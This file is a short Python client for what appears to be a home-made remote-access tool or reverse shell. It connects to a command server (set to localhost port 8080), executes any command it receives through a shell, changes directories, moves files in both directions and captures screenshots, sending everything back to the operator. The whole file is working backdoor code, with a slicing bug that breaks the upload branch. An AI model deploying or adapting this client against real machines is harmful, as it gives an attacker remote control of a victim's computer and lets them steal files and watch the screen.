#!/usr/bin/python3

# client-side

# modules

import socket
import os
import subprocess
from definitions import *

# definitions


# main program

host = '127.0.0.1'
port = 8080

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

while True:
    comm = client.recv(1024).decode()
    if comm == 'close':
        break
    elif comm[:3] == 'cd ':
        try:
            os.chdir(comm[3:])
        except FileNotFoundError as e:
            send_error(client, e)
    elif comm[7:] == 'upload ':
        file = comm[7:]
        download(client, file)
    elif comm[:9] == 'download ':
        file = comm[9:]
        upload(client, file)
    elif comm == 'screenshot':
        screenshot_client()
        upload(client, 'screenshot.png')
        os.remove('screenshot.png')
    else:
        try:
            output = subprocess.check_output(comm, text=True, shell=True)
            if output:
                client.send(output.encode())
            else:
                client.send('not output!'.encode())
        except Exception as e:
            send_error(client, e)
client.close()
